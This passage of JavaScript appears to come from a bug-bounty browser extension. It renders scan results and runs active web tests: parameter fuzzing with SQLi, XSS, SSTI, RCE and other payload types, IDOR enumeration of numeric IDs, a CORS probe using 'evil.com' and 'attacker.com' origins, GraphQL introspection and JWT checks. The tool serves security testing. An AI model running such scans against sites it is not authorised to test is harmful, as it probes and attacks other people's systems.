  if(alertOnly==="1") items=items.filter(r=>r.interesting);
  showTable("fuzzer",items.length>0); if(!items.length) return;
  document.getElementById("body-fuzzer").innerHTML=items.map(r=>{
    const alert=r.interesting?"b-vuln":"b-safe", alertTxt=r.interesting?"⚠ INTERESTING":"—";
    const sizeDelta=r.sizeDelta>0?"+"+r.sizeDelta:r.sizeDelta;
    return `<tr>
      <td class="accent">${highlight(r.param,q)}</td>
      <td><span class="badge b-${(r.type||"").toLowerCase()}">${esc(r.type||"")}</span></td>
      <td class="dim" style="max-width:140px" title="${esc(r.payload||"")}">${highlight((r.payload||"").substring(0,30),q)}</td>
      <td><span class="badge b-info">${r.status||"—"}</span></td>
      <td class="${r.sizeDelta!==0?"accent":"dim"}">${sizeDelta}</td>
      <td><span class="badge ${alert}">${alertTxt}</span></td>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(r.url||"")}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-fuzzer");
}

// ─── Render IDOR ─────────────────────────────────────────────
function renderIdor() {
  const q=getSearch();
  let items=allData.idorResults||[];
  if(q) items=items.filter(r=>
    (r.param+"").toLowerCase().includes(q) ||
    (r.url+"").toLowerCase().includes(q)
  );
  showTable("idor",items.length>0); if(!items.length) return;
  document.getElementById("body-idor").innerHTML=items.map(r=>{
    const alert=r.interesting?"b-vuln":"b-safe", alertTxt=r.interesting?"⚠ POSSIBLE IDOR":"—";
    return `<tr>
      <td class="accent">${highlight(r.param,q)}</td>
      <td class="dim">${esc(r.origVal)}</td>
      <td class="dim">${esc(r.testVal)}</td>
      <td><span class="badge ${r.statusChanged?"b-changed":"b-safe"}">${r.statusChanged?"CHANGED":"SAME"}</span></td>
      <td class="${r.sizeDelta!==0?"accent":"dim"}">${r.sizeDelta>0?"+"+r.sizeDelta:r.sizeDelta}</td>
      <td><span class="badge ${alert}">${alertTxt}</span></td>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(r.url||"")}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-idor");
}

// ─── Render CORS ─────────────────────────────────────────────
function renderCors() {
  const q=getSearch(), vulnOnly=getFilter("fCorsVuln");
  let items=allData.corsResults||[];
  if(q) items=items.filter(r=>(r.url+"").toLowerCase().includes(q));
  if(vulnOnly==="1") items=items.filter(r=>r.vulnerable);
  // Deduplicate by URL + show worst result
  const byUrl={};
  items.forEach(r=>{ if(!byUrl[r.url]||r.vulnerable) byUrl[r.url]=r; });
  items=Object.values(byUrl);
  showTable("cors",items.length>0); if(!items.length) return;
  document.getElementById("body-cors").innerHTML=items.map(r=>{
    const verdict=r.vulnerable?"b-critical":"b-safe", vTxt=r.vulnerable?"⚠ VULNERABLE":"SAFE";
    return `<tr>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="dim" style="max-width:180px">${esc(r.acao||"—")}</td>
      <td><span class="badge ${r.acac?"b-high":"b-ok"}">${r.acac?"true":"false"}</span></td>
      <td><span class="badge ${verdict}">${vTxt}</span></td>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(r.url||"")}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-cors");
}

// ─── Render GraphQL ──────────────────────────────────────────
function renderGraphQL() {
  const q=getSearch();
  let items=allData.graphqlResults||[];
  if(q) items=items.filter(r=>
    (r.name+"").toLowerCase().includes(q) ||
    (r.url+"").toLowerCase().includes(q)
  );
  showTable("graphql",items.length>0); if(!items.length) return;
  document.getElementById("body-graphql").innerHTML=items.map(r=>{
    return `<tr>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td><span class="badge ${r.introspectionEnabled?"b-vuln":"b-ok"}">${r.introspectionEnabled?"OPEN":"BLOCKED"}</span></td>
      <td class="dim">${esc(r.kind||"—")}</td>
      <td class="accent">${highlight(r.name||"—",q)}</td>
      <td class="dim">${r.fieldCount||0} fields</td>
    </tr>`;
  }).join("");
}

// ─── Render Subdomains ───────────────────────────────────────
function renderSubdomains() {
  const q=getSearch();
  let items=allData.subdomains||[];
  if(q) items=items.filter(s=>(s.host+"").toLowerCase().includes(q));
  showTable("subdomains",items.length>0); if(!items.length) return;
  document.getElementById("body-subdomains").innerHTML=items.map(s=>{
    const d=s.discovered?new Date(s.discovered).toLocaleTimeString():"—";
    return `<tr>
      <td><span class="url-link" data-url="${escAttr("https://"+s.host)}">${highlight(s.host,q)}</span></td>
      <td><span class="url-link" data-url="${escAttr(s.source||"")}">${shortUrl(s.source)}</span></td>
      <td class="dim">${d}</td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(s.host)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-subdomains");
}

// ─── Render WebSocket - with messages ────────────────────────
function renderWebSocket() {
  const q=getSearch();
  let items=allData.websocketConnections||[];
  if(q) items=items.filter(ws=>(ws.url+"").toLowerCase().includes(q));
  showTable("websocket",items.length>0); if(!items.length) return;

  document.getElementById("body-websocket").innerHTML=items.map(ws=>{
    const statusBadge=ws.status==="OPEN"?"b-ok":ws.status==="ERROR"?"b-high":"b-info";
    return `<tr data-ws-url="${escAttr(ws.url)}">
      <td><span class="url-link" data-url="${escAttr(ws.url)}">${highlight(shortUrl(ws.url),q)}</span></td>
      <td class="dim">${esc(ws.protocol||"—")}</td>
      <td><span class="badge ${statusBadge}">${esc(ws.status||"?")}</span></td>
      <td class="accent">${ws.sentCount||0}</td>
      <td class="accent">${ws.receivedCount||0}</td>
      <td class="dim">${new Date(ws.timestamp).toLocaleTimeString()}</td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(ws.url)}">copy</button></td>
    </tr>`;
  }).join("");

  // Render messages panel
  const msgPanel=document.getElementById("ws-messages-panel");
  if (msgPanel) {
    msgPanel.innerHTML = items.filter(ws=>ws.messages&&ws.messages.length>0).map(ws=>`
      <div class="ws-messages">
        <div style="font-size:10px;font-weight:700;color:var(--accent);padding-bottom:4px;border-bottom:1px solid var(--border);margin-bottom:4px;">
          📨 ${esc(shortUrl(ws.url))} — last ${ws.messages.length} messages
        </div>
        ${ws.messages.map(m=>`
          <div class="ws-msg ${m.direction==="IN"?"ws-msg-in":"ws-msg-out"}">
            <span class="ws-msg-dir">${m.direction==="IN"?"↓ IN":"↑ OUT"}</span>
            <span class="ws-msg-data">${esc(m.data||"")}</span>
          </div>
        `).join("")}
      </div>
    `).join("");
  }

  attachCopy("body-websocket");
}

// ─── Render Custom Payloads ───────────────────────────────────
function renderCustomPayloads() {
  const q=getSearch();
  let items=allData.customPayloads||[];
  if(q) items=items.filter(p=>
    (p.payload+"").toLowerCase().includes(q) ||
    (p.type+"").toLowerCase().includes(q)
  );
  showTable("custom-payloads",items.length>0); if(!items.length) return;
  const typeColors={sqli:"b-critical",xss:"b-high",lfi:"b-low",ssrf:"b-info",ssti:"b-medium",rce:"b-critical",idor:"b-high"};
  document.getElementById("body-custom-payloads").innerHTML=items.map(p=>{
    return `<tr>
      <td><span class="badge ${typeColors[p.type]||"b-info"}">${esc(p.type.toUpperCase())}</span></td>
      <td class="accent" style="font-family:'JetBrains Mono';font-size:10px;">${highlight(p.payload,q)}</td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(p.payload)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-custom-payloads");
}

// ─── Render JWT ───────────────────────────────────────────────
function renderJWT() {
  const items=allData.jwtTokens||[];
  showTable("jwt",items.length>0); if(!items.length) return;
  document.getElementById("body-jwt").innerHTML=items.map(t=>{
    const warns=t.warnings||[];
    const warnBadge=warns.length?"b-critical":"b-ok";
    const warnTxt=warns.length?"⚠ "+warns.length+" issue(s)":"✓ OK";
    return `<tr>
      <td class="dim" style="font-family:'JetBrains Mono';font-size:10px;">${esc(t.token)}</td>
      <td class="accent">${esc(t.algorithm)}</td>
      <td class="${t.expired?"b-high":""} dim">${esc(t.expires)}</td>
      <td><span class="badge ${warnBadge}" title="${esc(warns.join(", "))}">${warnTxt}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(t.token)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-jwt");
}

// ─── Render API Docs ──────────────────────────────────────────
function renderApiDocs() {
  const q=getSearch();
  let items=allData.apiDocs||[];
  if(q) items=items.filter(d=>(d.url+"").toLowerCase().includes(q));
  showTable("api-docs",items.length>0); if(!items.length) return;
  document.getElementById("body-api-docs").innerHTML=items.map(doc=>{
    const tb=doc.type==="Swagger"?"b-high":doc.type==="OpenAPI"?"b-info":"b-medium";
    return `<tr>
      <td><span class="url-link" data-url="${escAttr(doc.url)}">${highlight(shortUrl(doc.url),q)}</span></td>
      <td><span class="badge ${tb}">${esc(doc.type)}</span></td>
      <td class="dim">${esc(doc.version)}</td>
      <td class="accent">${doc.endpoints||0}</td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(doc.url)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-api-docs");
}

// ─── Auto Test ───────────────────────────────────────────────
async function startAutoTest() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const highParams=allData.params.filter(p=>paramRisk(p.key)==="HIGH"&&p.url);
  if (!highParams.length) { setStatus("No HIGH risk params. Scan first."); return; }
  const btn=document.getElementById("autoTestBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="🤖 Testing...";
  let tested=0;
  for (const param of highParams.slice(0,8)) {
    for (const type of ["xss","sqli","ssti"]) {
      try {
        const payload=PAYLOADS[type][0], testUrl=new URL(param.url);
        testUrl.searchParams.set(param.key,payload);
        setStatus(`[${++tested}] Testing ${type.toUpperCase()} → ${param.key}`);
        const resp=await fetch(testUrl.href,{signal:AbortSignal.timeout(5000),credentials:"include"});
        const body=await resp.text();
        const reflected=body.toLowerCase().includes(payload.substring(0,10).toLowerCase());
        await chrome.runtime.sendMessage({ type:"ADD_PAYLOAD_RESULT", tabId:currentTabId,
          result:{param:param.key,url:testUrl.href,payloadType:type,payload,status:resp.status,reflected,timestamp:Date.now()} });
        if (reflected) setStatus("⚠️ REFLECTED "+type.toUpperCase()+": "+param.key);
      } catch(_) {}
      await sleep(150);
    }
  }
  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="🤖 Auto Test HIGH params";
  setStatus("✓ Auto test done — "+allData.payloadResults.length+" results");
  switchTab("reflect");
}

// ─── Fuzzer ──────────────────────────────────────────────────
async function startFuzzer() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const params=allData.params.filter(p=>p.url);
  if (!params.length) { setStatus("No params to fuzz. Scan first."); return; }
  fuzzStop=false;
  const btn=document.getElementById("runFuzzBtn"), stopBtn=document.getElementById("stopFuzzBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="⚡ Fuzzing...";
  stopBtn.style.display="flex";
  const delay=parseInt(document.getElementById("fuzzDelay").value)||200;
  const typeFilter=document.getElementById("fuzzType").value;
  const types=typeFilter==="all"?["sqli","xss","lfi","ssrf","ssti","rce","idor"]:[typeFilter];
  const seen=new Set();
  const deduped=params.filter(p=>{ const k=p.key+"|"+p.url; if(seen.has(k)) return false; seen.add(k); return true; });
  let count=0;

  const baselines={};
  for (const param of deduped.slice(0,20)) {
    if (fuzzStop) break;
    try {
      const r=await fetch(param.url,{signal:AbortSignal.timeout(4000),credentials:"include"});
      const t=await r.text();
      baselines[param.url]={status:r.status,size:t.length};
    } catch(_) {}
  }

  for (const param of deduped.slice(0,20)) {
    if (fuzzStop) break;
    for (const type of types) {
      const payloadList=[...(PAYLOADS[type]||[]).slice(0,5)];
      // Add custom payloads of same type
      const custom=(allData.customPayloads||[]).filter(cp=>cp.type===type).map(cp=>cp.payload);
      payloadList.push(...custom.slice(0,3));
      for (const payload of payloadList) {
        if (fuzzStop) break;
        try {
          const testUrl=new URL(param.url);
          testUrl.searchParams.set(param.key,payload);
          setStatus(`[${++count}] ${type} → ${param.key}: ${payload.substring(0,30)}`);
          const resp=await fetch(testUrl.href,{signal:AbortSignal.timeout(5000),credentials:"include"});
          const body=await resp.text();
          const base=baselines[param.url]||{status:200,size:0};
          const sizeDelta=body.length-base.size;
          const statusChanged=resp.status!==base.status;
          const reflected=body.toLowerCase().includes(payload.substring(0,8).toLowerCase());
          const interesting=reflected||statusChanged||(Math.abs(sizeDelta)>500);
          await chrome.runtime.sendMessage({ type:"ADD_FUZZ_RESULT", tabId:currentTabId,
            result:{param:param.key,type:type.toUpperCase(),payload,status:resp.status,sizeDelta,reflected,interesting,url:testUrl.href,timestamp:Date.now()} });
          if (interesting) setStatus("⚠️ INTERESTING: "+param.key+" ["+type.toUpperCase()+"]");
        } catch(_) {}
        await sleep(delay);
      }
    }
  }

  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="⚡ Start Fuzzing";
  stopBtn.style.display="none"; fuzzStop=false;
  setStatus("✓ Fuzzing done — "+allData.fuzzResults.length+" results");
  switchTab("fuzzer");
}

// ─── IDOR ────────────────────────────────────────────────────
async function startIdorScan() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const idorParams=allData.params.filter(p=>{
    const k=(p.key||"").toLowerCase();
    return p.url && /\b(id|uid|user_?id|account_?id|post_?id|item_?id|order_?id|product_?id|doc_?id|record_?id)\b/.test(k) && /^\d+$/.test((p.value||"").trim());
  });
  if (!idorParams.length) { setStatus("No numeric ID params found."); return; }
  const btn=document.getElementById("runIdorBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="🔁 Scanning...";
  const testVals=["0","1","2","3","99","100","999","9999","-1"];
  let count=0;
  for (const param of idorParams.slice(0,10)) {
    const origVal=(param.value||"1").trim();
    try {
      const origUrl=new URL(param.url);
      origUrl.searchParams.set(param.key,origVal);
      const origResp=await fetch(origUrl.href,{signal:AbortSignal.timeout(5000),credentials:"include"});
      const origBody=await origResp.text();
      const origSize=origBody.length;
      for (const testVal of testVals) {
        if (testVal===origVal) continue;
        try {
          const testUrl=new URL(param.url);
          testUrl.searchParams.set(param.key,testVal);
          setStatus(`[${++count}] IDOR: ${param.key}=${testVal}`);
          const resp=await fetch(testUrl.href,{signal:AbortSignal.timeout(5000),credentials:"include"});
          const body=await resp.text();
          const sizeDelta=body.length-origSize;
          const statusChanged=resp.status!==origResp.status;
          const interesting=!statusChanged&&resp.status===200&&Math.abs(sizeDelta)<(origSize*0.3)&&origSize>100;
          await chrome.runtime.sendMessage({ type:"ADD_IDOR_RESULT", tabId:currentTabId,
            result:{param:param.key,origVal,testVal,status:resp.status,sizeDelta,statusChanged,interesting,url:testUrl.href,timestamp:Date.now()} });
        } catch(_) {}
        await sleep(200);
      }
    } catch(_) {}
  }
  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="🔁 Start IDOR Scan";
  setStatus("✓ IDOR done — "+allData.idorResults.length+" results");
  switchTab("idor");
}

// ─── CORS ────────────────────────────────────────────────────
async function startCorsTester() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const endpoints=[...new Set(
    allData.endpoints.filter(e=>e.url&&e.url.startsWith("http")).map(e=>e.url)
    .concat(allData.requests.filter(r=>r.url&&r.url.startsWith("http")).map(r=>r.url))
  )].slice(0,30);
  if (!endpoints.length) { setStatus("No endpoints to test. Scan first."); return; }
  const btn=document.getElementById("runCorsBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="🌐 Testing...";
  const evilOrigins=["https://evil.com","https://attacker.com","null"];
  for (const url of endpoints) {
    for (const origin of evilOrigins) {
      try {
        setStatus("CORS: "+shortUrl(url)+" ← "+origin);
        const resp=await fetch(url,{method:"GET",credentials:"include",headers:{"Origin":origin},signal:AbortSignal.timeout(5000)});
        const acao=resp.headers.get("access-control-allow-origin")||"";
        const acac=resp.headers.get("access-control-allow-credentials")||"";
        const vulnerable=(acao==="*")||(acao===origin&&acac.toLowerCase()==="true")||(acao==="null"&&origin==="null");
        await chrome.runtime.sendMessage({ type:"ADD_CORS_RESULT", tabId:currentTabId,
          result:{url,origin,acao,acac:acac.toLowerCase()==="true",vulnerable,timestamp:Date.now()} });
        if (vulnerable) { setStatus("⚠️ CORS VULN: "+url); break; }
      } catch(_) {}
      await sleep(150);
    }
  }
  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="🌐 Test CORS";
  const vulns=allData.corsResults.filter(r=>r.vulnerable).length;
  setStatus(`✓ CORS done — ${vulns} vulnerable`);
  switchTab("cors");
}

// ─── GraphQL ─────────────────────────────────────────────────
async function startGraphQL() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const btn=document.getElementById("runGqlBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="◈ Probing...";
  const candidateUrls=new Set();
  allData.endpoints.forEach(e=>{ if(e.type==="GRAPHQL"||/graphql/i.test(e.path)) candidateUrls.add(e.url||e.path); });
  allData.requests.forEach(r=>{ if(/graphql/i.test(r.url)) candidateUrls.add(r.url); });
  const target=allData.target;
  if (target?.host) {
    ["/graphql","/api/graphql","/graphql/v1","/v1/graphql","/query"].forEach(p=>{
      candidateUrls.add("https://"+target.host+p);
    });
  }
  if (!candidateUrls.size) { setStatus("No GraphQL endpoints found."); btn.disabled=false; btn.classList.remove("running"); btn.textContent="◈ Run Introspection"; return; }
  const q=`{"query":"{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}`;
  for (const url of candidateUrls) {
    try {
      setStatus("GraphQL: "+shortUrl(url));
      const resp=await fetch(url,{method:"POST",credentials:"include",headers:{"Content-Type":"application/json","Accept":"application/json"},body:q,signal:AbortSignal.timeout(6000)});
      if (!resp.ok) continue;
      const data=await resp.json();
      if (!data?.data?.__schema) continue;
      const types=(data.data.__schema.types||[]).filter(t=>!t.name.startsWith("__"));
      for (const type of types.slice(0,50)) {
        await chrome.runtime.sendMessage({ type:"ADD_GRAPHQL_RESULT", tabId:currentTabId,
          result:{url,introspectionEnabled:types.length>0,kind:type.kind,name:type.name,fieldCount:(type.fields||[]).length,timestamp:Date.now()} });
      }
      if (types.length) setStatus("⚠️ GraphQL introspection OPEN: "+url);
    } catch(_) {}
  }
  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="◈ Run Introspection";
  if (!allData.graphqlResults.length) setStatus("GraphQL: no open introspection found");
  else { setStatus("✓ GraphQL done — "+allData.graphqlResults.length+" types exposed"); switchTab("graphql"); }
}

// ─── JWT Decoder + Security Check ────────────────────────────
function decodeJWT() {
  const input=document.getElementById("jwtInput");
  const token=input?.value.trim();
  if (!token) { setStatus("No JWT token entered"); return; }
  const parts=token.split(".");
  if (parts.length!==3) { setStatus("Invalid JWT format (need 3 parts)"); return; }
  try {
    const header=JSON.parse(atob(parts[0].replace(/-/g,"+").replace(/_/g,"/")));
    const payload=JSON.parse(atob(parts[1].replace(/-/g,"+").replace(/_/g,"/")));
    const signature=parts[2];

    // Security checks
    const warnings=[];
    if (header.alg==="none" || header.alg==="NONE") warnings.push("alg:none — signature not verified!");
    if (header.alg==="HS256") warnings.push("Weak algorithm: HS256 (brute-forceable)");
    if (!payload.exp) warnings.push("No expiration (exp claim missing)");
    const now=Math.floor(Date.now()/1000);
    const expired=payload.exp && payload.exp < now;
    if (expired) warnings.push("Token is EXPIRED (exp: "+new Date(payload.exp*1000).toLocaleString()+")");
    if (payload.iat && (now - payload.iat) > 86400*30) warnings.push("Token issued >30 days ago");

    // Show warnings
    const warnEl=document.getElementById("jwt-warnings");
    if (warnEl) {
      warnEl.innerHTML=warnings.map(w=>`<div style="background:#ef444415;border:1px solid #ef444430;color:#ef4444;border-radius:4px;padding:5px 10px;font-size:10px;margin-bottom:4px;">⚠ ${esc(w)}</div>`).join("");
    }

    document.getElementById("jwt-header").textContent=JSON.stringify(header,null,2);
    document.getElementById("jwt-payload").textContent=JSON.stringify(payload,null,2);
    document.getElementById("jwt-signature").textContent=signature.substring(0,60)+(signature.length>60?"...":"");
    document.getElementById("jwt-results").style.display="block";
    document.getElementById("empty-jwt").style.display="none";

    if (!allData.jwtTokens) allData.jwtTokens=[];
    const tokenData={
      token:token.substring(0,60)+(token.length>60?"...":""),
      algorithm:header.alg||"—",
      expires:payload.exp?new Date(payload.exp*1000).toLocaleString():"Never",
      expired, issuer:payload.iss||"—", subject:payload.sub||"—",
      warnings, timestamp:Date.now()
    };
    if (!allData.jwtTokens.find(t=>t.token===tokenData.token)) {
      allData.jwtTokens.push(tokenData);
      chrome.runtime.sendMessage({ type:"ADD_JWT_TOKEN", tabId:currentTabId, token:tokenData });
    }
    renderJWT(); updateCounts();
    setStatus(warnings.length?"⚠️ JWT decoded — "+warnings.length+" security issue(s)":"✓ JWT decoded");
  } catch(e) { setStatus("Decode error: "+e.message); }
}

// ─── API Docs ─────────────────────────────────────────────────
async function scanApiDocs() {
  if (!allData.target?.host && !allData.target?.noFilter) { openModal(); setStatus("Set target first"); return; }
  const btn=document.getElementById("scanApiDocsBtn");
  btn.disabled=true; btn.classList.add("running"); btn.textContent="🔍 Scanning...";
  setStatus("Scanning for API docs...");
  if (!allData.apiDocs) allData.apiDocs=[];
  let target="";
  try {
    const tabs=await chrome.tabs.query({active:true,currentWindow:true});
    target=allData.target?.host||new URL(tabs[0]?.url||"").hostname;
  } catch(_) {}
  if (!target) { setStatus("No target set"); btn.disabled=false; btn.classList.remove("running"); btn.textContent="🔍 Scan for API Docs"; return; }
  const paths=["/swagger.json","/swagger.yaml","/api/swagger.json","/openapi.json","/openapi.yaml",
    "/api/openapi.json","/api-docs","/api-docs/swagger.json","/swagger-ui.html",
    "/v1/swagger.json","/v2/swagger.json","/v3/swagger.json","/api/v1/swagger.json"];
  const proto=target.includes("localhost")?"http://":"https://";
  let found=0;
  for (const path of paths) {
    try {
      const url=proto+target+path;
      const resp=await fetch(url,{signal:AbortSignal.timeout(3000),credentials:"include"});
      if (resp.ok) {
        const text=await resp.text();
        let docData={}, endpoints=0, version="—";
        try {
          docData=JSON.parse(text);
          version=docData.info?.version||docData.swagger||docData.openapi||"—";
          if (docData.paths) endpoints=Object.keys(docData.paths).length;
        } catch(_) {}
        const docType=path.includes("swagger")?"Swagger":path.includes("openapi")?"OpenAPI":"API Docs";
        if (!allData.apiDocs.find(d=>d.url===url)) {
          const doc={url,type:docType,version,endpoints,timestamp:Date.now()};
          allData.apiDocs.push(doc);
          found++;
          chrome.runtime.sendMessage({type:"ADD_API_DOC",tabId:currentTabId,doc});
          setStatus(`✓ Found: ${docType} at ${path}`);
        }
      }
    } catch(_) {}
    await sleep(100);
  }
  await loadData();
  btn.disabled=false; btn.classList.remove("running"); btn.textContent="🔍 Scan for API Docs";
  renderApiDocs(); updateCounts();
  setStatus(found>0?`✓ Found ${found} API doc(s)`:"No API docs found");
}

// ─── Custom Payloads ─────────────────────────────────────────
const CUSTOM_PAYLOADS_STORAGE_KEY="bountyscope_custom_payloads";

async function loadCustomPayloads() {
  try {
    const result=await chrome.storage.local.get(CUSTOM_PAYLOADS_STORAGE_KEY);
    const saved=result[CUSTOM_PAYLOADS_STORAGE_KEY]||[];
    allData.customPayloads=saved;
    saved.forEach(cp=>{
      if (!PAYLOADS[cp.type]) PAYLOADS[cp.type]=[];
      if (!PAYLOADS[cp.type].includes(cp.payload)) PAYLOADS[cp.type].push(cp.payload);
    });
  } catch(e) {}
}

async function addCustomPayload() {
  const type=document.getElementById("customPayloadType").value;
  const input=document.getElementById("customPayloadInput");
  const payloads=input.value.trim().split("\n").filter(p=>p.trim());
  if (!payloads.length) { setStatus("No payloads entered"); return; }
  const result=await chrome.storage.local.get(CUSTOM_PAYLOADS_STORAGE_KEY);
  const existing=result[CUSTOM_PAYLOADS_STORAGE_KEY]||[];
  payloads.forEach(p=>{
    const payload=p.trim();
    if (!existing.find(cp=>cp.type===type&&cp.payload===payload)) {
      existing.push({type,payload,addedAt:Date.now()});
      if (!PAYLOADS[type]) PAYLOADS[type]=[];
      if (!PAYLOADS[type].includes(payload)) PAYLOADS[type].push(payload);
    }
  });
  await chrome.storage.local.set({[CUSTOM_PAYLOADS_STORAGE_KEY]:existing});
  allData.customPayloads=existing;
  input.value="";
  await chrome.runtime.sendMessage({type:"SAVE_CUSTOM_PAYLOADS",tabId:currentTabId,payloads:existing});
  renderCustomPayloads(); updateCounts();
  setStatus(`✓ Added ${payloads.length} ${type.toUpperCase()} payload(s)`);
}

async function clearCustomPayloads() {
  if (!confirm("Clear all custom payloads permanently?")) return;
  allData.customPayloads=[];
  await chrome.storage.local.set({[CUSTOM_PAYLOADS_STORAGE_KEY]:[]});
  await chrome.runtime.sendMessage({type:"SAVE_CUSTOM_PAYLOADS",tabId:currentTabId,payloads:[]});
  renderCustomPayloads(); updateCounts();
  setStatus("Custom payloads cleared");
}

// ─── Payload Copy ─────────────────────────────────────────────
function copyPayload(type, el) {
  const list=PAYLOADS[type]; if(!list) return;
  const payload=list[Math.floor(Math.random()*list.length)];
  doCopyText(payload);
  setStatus("Copied "+type.toUpperCase()+": "+payload.substring(0,50));
  el.classList.add("fired"); setTimeout(()=>el.classList.remove("fired"),500);
}

// ─── Copy helpers ─────────────────────────────────────────────
function attachCopy(tbodyId) {
  const tbody=document.getElementById(tbodyId); if(!tbody) return;
  const nb=tbody.cloneNode(true); tbody.parentNode.replaceChild(nb,tbody);
  nb.addEventListener("click", e=>{
    const btn=e.target.closest(".cbtn"); if(!btn) return;
    doCopy(btn,btn.getAttribute("data-copy")||"");
  });
}

function doCopy(btn, text) {
  const decoded=unesc(text); doCopyText(decoded);
  btn.textContent="✓"; btn.classList.add("done");
  setTimeout(()=>{btn.textContent="copy";btn.classList.remove("done");},1500);
  setStatus("Copied: "+decoded.substring(0,70));
}

function doCopyText(text) {
  navigator.clipboard?.writeText(text).catch(()=>fallbackCopy(text))||fallbackCopy(text);
}

function fallbackCopy(text) {
  const ta=document.createElement("textarea"); ta.value=text;
  ta.style.cssText="position:fixed;opacity:0;top:0;left:0;";
  document.body.appendChild(ta); ta.focus(); ta.select(); document.execCommand("copy"); document.body.removeChild(ta);
}

// ─── Helpers ──────────────────────────────────────────────────
function setStatus(msg) { const el=document.getElementById("statusTxt"); if(el) el.textContent=msg; }
function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }

function esc(str) {
  return String(str||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
}
function escAttr(str) { return String(str||"").replace(/&/g,"&amp;").replace(/"/g,"&quot;"); }
function unesc(str) { return String(str||"").replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&#39;/g,"'"); }

function shortUrl(url) {
  if (!url) return "-";
  try {
    const u=new URL(url);
    let p=u.pathname;
    if (p.length>35) p="..."+p.slice(-32);
    return esc(u.hostname+p);
  } catch(_) { return esc(String(url).substring(0,55)); }
}

function maskSecret(val) {
  const s=String(val||"");
  if (s.length<=8) return "●".repeat(s.length);
  return s.substring(0,4)+"●".repeat(Math.min(s.length-8,20))+s.slice(-4);
}
